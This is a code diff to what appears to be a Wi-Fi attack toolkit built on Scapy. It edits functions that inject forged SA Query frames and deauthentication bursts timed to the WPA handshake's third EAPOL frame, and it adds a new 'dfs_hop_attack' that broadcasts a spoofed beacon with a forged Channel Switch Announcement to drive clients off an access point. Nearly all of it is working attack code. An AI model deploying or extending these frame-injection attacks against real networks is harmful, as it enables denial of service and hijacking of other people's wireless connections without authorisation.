@@ -1,10 +1,10 @@
 from time import sleep
 
-from scapy.fields import ByteField, FieldListField, FieldLenField
+from scapy.contrib.wpa_eapol import WPA_key
+from scapy.fields import ByteField
+from scapy.layers.dot11 import Dot11, Dot11Auth, RadioTap, Dot11AssoReq, EAPOL, Dot11Elt, Dot11Beacon
 from scapy.packet import Packet
 from scapy.sendrecv import sniff
-from scapy.contrib.wpa_eapol import WPA_key
-from scapy.layers.dot11 import Dot11, Dot11Auth, RadioTap, Dot11AssoReq, EAPOL, Dot11Deauth, Dot11Elt
 from termcolor import cprint
 
 from hijacker.core import Station, AP
@@ -52,7 +52,7 @@ def sa_query_attack(interface, ap, sta):
         '\x00\x0f\xac\x04'  # AES Cipher
         '\x01\x00'  # 1 Authentication Key Managment Suite (line below)
         '\x00\x0f\xac\x02'  # Pre-Shared Key
-        '\x80\x00'))  # RSN Capabilities (no extra capabilities)
+        '\x80\x00'))  # Supports MFP
     interface.inject(pkt)
 
 
@@ -64,7 +64,7 @@ def ap_deauth(interface: MonitorInterface, ap: AP, sta: Station):
             key = layer.key_info
             if key & WPA_KEY_INFO_MIC and key & WPA_KEY_INFO_INSTALL and key & WPA_KEY_INFO_ACK:  # frame 3
                 cprint("Attacking {}!".format(p.addr1), 'red')
-                interface.deauth(ap.bssid, sta.mac_addr, bssid=ap.bssid, burst_count=5, reason=3)
+                interface.deauth(ap.bssid, sta.mac_addr, burst_count=5, reason=3)
 
     return ap_deauth_cb
 
@@ -74,6 +74,31 @@ def eapol_attack_deauth(interface: MonitorInterface, ap: AP, sta: Station, spam:
         interface.deauth(ap.bssid, sta.mac_addr, count=100, reason=3)
     print("Waiting for EAPOL frame 3...")
     sniff(iface=interface.name, prn=ap_deauth(interface, ap, sta))
+
+
+def dfs_hop_attack(interface: MonitorInterface, ap: AP, essid):
+    pkt = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=ap.bssid, addr3=ap.bssid) / \
+          Dot11Beacon(cap=0x1104) / Dot11Elt(ID='SSID', info=essid, len=len(essid)) / \
+          Dot11Elt(ID='RSNinfo', info=(
+              '\x01\x00'  # RSN Version 1
+              '\x00\x0f\xac\x04'  # Group Cipher Suite : 00-0f-ac CCMP
+              '\x01\x00'  # 2 Pairwise Cipher Suite (next line)
+              '\x00\x0f\xac\x04'  # AES Cipher
+              '\x01\x00'  # 1 Authentication Key Managment Suite (line below)
+              '\x00\x0f\xac\x02'  # Pre-Shared Key
+              '\xcc\x00'  # Supports and requires MFP
+          )) / Dot11EltCSAM()
+    interface.inject(pkt)
+
+
+class Dot11EltCSAM(Packet):
+    name = "Channel Switch Announcement"
+
+    fields_desc = [
+        ByteField("Mode", 0),
+        ByteField("Number", 128),
+        ByteField("Count", 20)
+    ]
 
 
 class Dot11EltRates(Packet):
